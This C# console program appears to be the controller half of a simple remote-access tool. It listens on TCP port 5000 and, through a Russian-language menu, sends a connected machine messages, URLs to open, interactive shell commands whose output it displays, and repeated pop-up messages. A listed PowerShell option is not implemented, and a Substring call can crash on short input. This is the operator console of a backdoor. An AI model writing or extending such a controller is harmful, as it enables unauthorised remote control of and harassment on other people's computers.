using System.Net;
using System.Net.Sockets;
using System.Diagnostics;
var server = new TcpListener(IPAddress.Any, 5000);
server.Start();
var stream = server.AcceptTcpClient().GetStream();
var reader = new StreamReader(stream);
var writer = new StreamWriter(stream) { AutoFlush=true };

var data1 = reader.ReadLine();
string usst = "";
if (data1 != null && data1.StartsWith("USR:"))
{
    usst = data1.Substring(4);
    Console.WriteLine(usst);
}
string dadata = usst.Substring(19);
while (true)
{
    

    
    Console.Write("1 - написать сообщение, 2 - открыть ссылку, 3 - cmd, 4 - msg `text`, 5 - powershell: ");
    var choice = Console.ReadLine();
    if (choice == "1")
    {
        writer.WriteLine("MSG:" + Console.ReadLine());
    }
    else if (choice == "2")
    {
        Console.WriteLine("Ссылка с https:// :");
        writer.WriteLine("URL:" + Console.ReadLine());
    }
    else if (choice == "3")
    {
        string cmd = "";
        while (cmd != "exit")
        {
            Console.WriteLine($"cmd@{dadata}>");
            cmd = Console.ReadLine() ?? "";
            if (cmd == "exit") break;
            if (string.IsNullOrWhiteSpace(cmd)) continue;
            writer.WriteLine("CMD:" + cmd);
            var output = reader.ReadLine();
            if (output != null && output.StartsWith("OUT:"))
            {
                Console.WriteLine(output.Substring(4));
            }
        }
    }
    else if (choice == "4")
    {
        string text = "";
        int amout = 0;
        Console.WriteLine("Enter text:");
        text = Console.ReadLine() ?? "";
        Console.WriteLine("Enter amout:");
        amout = int.Parse(Console.ReadLine() ?? "0");
        writer.WriteLine("[MSG]");
        writer.WriteLine("MSGG:" + text);
        writer.WriteLine("AMTT:" + amout);
    }

}